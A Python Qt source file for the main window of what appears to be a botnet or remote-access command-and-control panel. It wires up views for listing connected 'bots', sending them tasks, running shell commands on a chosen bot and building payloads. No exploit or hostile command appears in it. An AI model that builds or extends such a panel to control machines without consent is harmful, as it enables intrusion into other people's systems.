import logging

from qtpy.QtCore import QMetaObject, Signal, Qt, QSize, Slot
from qtpy.QtWidgets import QDialogButtonBox, QApplication

from qrainbowstyle.windows import FramelessWindow, FramelessQuestionMessageBox, FramelessCriticalMessageBox, FramelessWarningMessageBox
from qrainbowstyle.widgets import WaitingSpinner
from qrainbowstyle.utils import StyleLooper


from models import Bot
from core.Network import GUIClient
from view.TaskWindow import TaskWindow
from view.ConsoleWindow import Console
from view.DeviceWindow import DeviceWindow
from view.PayloadWindow import PayloadWindow
from view.MainWindow import TitlebarMenu, MainWidget
from view.RemoteConnectWindow import RemoteConnectWindow
from view.SetupWindow import SetupDialog


class MainWindow(FramelessWindow):
    """Main window controler manages signals and GUI IO."""
    setup_cancelled = Signal()

    def __init__(self, parent=None, local=False):
        super(MainWindow, self).__init__(parent)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.local = local

        self.content_widget = MainWidget(self)

        # windows and widgets
        self.connect_dialog = None
        self.setup_dialog = None
        self.close_dialog = None

        self.device_window = None
        self.task_window = None
        self.payload_window = None
        self.console_window = None
        self.spinner = None
        self.menu = None
        self.styler = StyleLooper()

        self.client = GUIClient()
        self.client.connected.connect(self.on_gui_client_connected)

        self.client.bot_connected.connect(self.content_widget.add_bot)
        self.client.bot_disconnected.connect(self.content_widget.remove_bot)
        self.client.bot_updated.connect(self.content_widget.update_bot)

        self.client.get_config.connect(self.on_gui_client_config)
        self.client.start_first_setup.connect(self.on_start_first_setup)
        self.client.error.connect(self.on_gui_client_error)

        try:
            self.closeClicked.disconnect()
        except Exception:  # noqa
            pass
        self.closeClicked.connect(self.on_close_requested)
        self.resize(QSize(1500, 900))

    @Slot()
    def setup_connect_dialog(self):
        """Show connect dialog."""
        self.connect_dialog = RemoteConnectWindow()
        self.client.connected.connect(self.show)
        self.client.connected.connect(self.connect_dialog.on_gui_client_connected)
        self.client.failed_to_connect.connect(self.connect_dialog.on_gui_client_failed_to_connect)
        self.connect_dialog.connect_clicked.connect(self.connect_to_gui_server)
        self.connect_dialog.closeClicked.connect(self.close_connect_dialog)
        self.connect_dialog.show()

    @Slot(str, int, bytes)
    def connect_to_gui_server(self, ip, port, key):
        """Try to connect to GUI server."""
        self.client.start(ip, port, key)

    @Slot(str, int)
    def on_gui_client_connected(self, server_ip, server_port):
        """Client connected to GUI server successfully."""
        self.client.disconnected.connect(self.on_gui_client_disconnected)
        self.client.on_get_config()

    @Slot(str)
    def on_gui_client_error(self, error):
        pass

    @Slot()
    def on_gui_client_failed_to_connect(self):
        pass

    @Slot()
    def on_start_first_setup(self):
        """When there is no config on server."""
        self.setup_dialog = SetupDialog()
        self.client.setup_options.connect(self.setup_dialog.set_options)
        self.client.config_validate_error.connect(self.setup_dialog.on_config_error)
        self.client.config_saved.connect(self.on_first_setup_finished)
        self.setup_dialog.accepted.connect(self.client.on_save_config)
        self.setup_dialog.cancelled.connect(self.setup_cancelled.emit)
        self.setup_dialog.restart_accepted.connect(self.close_with_server)
        self.client.on_get_setup_options()
        self.setup_dialog.show()

    @Slot()
    def on_first_setup_finished(self):
        self.setup_dialog.on_first_setup_finished()

    @Slot(dict)
    def on_gui_client_config(self, config: dict):
        if config:
            self.content_widget.bot_double_clicked.connect(self.on_bot_double_clicked)
            self.content_widget.task_button_clicked.connect(self.on_task_button_clicked)
            self.content_widget.payload_button_clicked.connect(self.on_payload_button_clicked)
            self.content_widget.setupUi(config)
            self.addContentWidget(self.content_widget)

            self.console_window = Console(self)
            self.client.message.connect(self.console_window.write)
            self.console_window.message.connect(self.client.write)
            self.console_window.setVisible(False)

            self.spinner = WaitingSpinner(self, modality=Qt.WindowModal, disableParentWhenSpinning=True,
                                          roundness=70.0, fade=70.0, radius=15.0, lines=6,
                                          line_length=25.0, line_width=4.0, speed=1.0)
            self.content_widget.load_finished.connect(self.spinner.stop)
            self.spinner.start()

            self.menu = TitlebarMenu(self)
            self.addMenu(self.menu)
            QMetaObject.connectSlotsByName(self)

    @Slot()
    def on_task_button_clicked(self):
        if self.task_window:
            self.task_window.show()
        else:
            self.task_window = TaskWindow(self)
            self.client.task_message.connect(self.task_window.process_task_message)
            self.task_window.send_task.connect(self.client.on_send_task)
            self.task_window.get_tasks.connect(self.client.on_get_tasks)
            self.task_window.setupUi()
            self.task_window.show()

    @Slot(Bot)
    def on_bot_double_clicked(self, bot: Bot):
        self.device_window = DeviceWindow(bot, self)
        self.device_window.stop_task.connect(self.client.on_stop_task)
        self.device_window.force_start_task.connect(self.client.on_force_start_task)
        self.device_window.run_shell.connect(self.client.on_run_shell)
        self.client.shell_error.connect(self.device_window.appendShell)
        self.client.shell_output.connect(self.device_window.appendShell)
        self.device_window.show()

    @Slot()
    def on_payload_button_clicked(self):
        if self.payload_window:
            self.payload_window.show()
        else:
            self.payload_window = PayloadWindow(self)
            self.client.build_message.connect(self.payload_window.process_build_message)
            self.payload_window.get_build_options.connect(self.client.on_get_build_options)
            self.payload_window.start_build.connect(self.client.on_start_build)
            self.payload_window.stop_build.connect(self.client.on_stop_build)
            self.payload_window.setupUi()
            self.payload_window.show()

    @Slot()
    def on_show_console_triggered(self):
        self.console_window.show()

    @Slot()
    def on_close_requested(self):
        self.close_dialog = FramelessQuestionMessageBox(self)
        self.close_dialog.setWindowModality(Qt.WindowModal)
        self.close_dialog.setStandardButtons(QDialogButtonBox.Yes | QDialogButtonBox.No)
        self.close_dialog.button(QDialogButtonBox.No).clicked.connect(self.close_with_server)
        self.close_dialog.button(QDialogButtonBox.Yes).clicked.connect(self.close_dialog.close)
        self.close_dialog.button(QDialogButtonBox.Yes).clicked.connect(self.close)
        self.close_dialog.setText("Do you want to keep server running?")
        self.close_dialog.show()

    @Slot()
    def on_gui_client_disconnected(self):
        self.setEnabled(False)
        self.close_dialog = FramelessCriticalMessageBox(self)
        self.close_dialog.setWindowModality(Qt.WindowModal)
        self.close_dialog.setStandardButtons(QDialogButtonBox.Ok)
        self.close_dialog.button(QDialogButtonBox.Ok).clicked.connect(self.close)
        self.close_dialog.setText("Connection lost! Application will be closed.")
        self.close_dialog.show()

    @Slot()
    def close_with_server(self):
        self.client.disconnected.connect(self.close)
        self.client.on_app_close()
        if self.spinner:
            self.spinner.start()

        if not self.local:
            QApplication.instance().exit()

    @Slot()
    def close_connect_dialog(self):
        self.connect_dialog.close()
        QApplication.instance().exit()

    @Slot()
    def close(self):
        if self.close_dialog:
            self.close_dialog.close()
        if self.setup_dialog:
            self.setup_dialog.close()
        if self.connect_dialog:
            self.connect_dialog.close()
        if self.payload_window:
            self.payload_window.close()
        if self.client:
            self.client.close()
            self.client.wait()
        super().close()
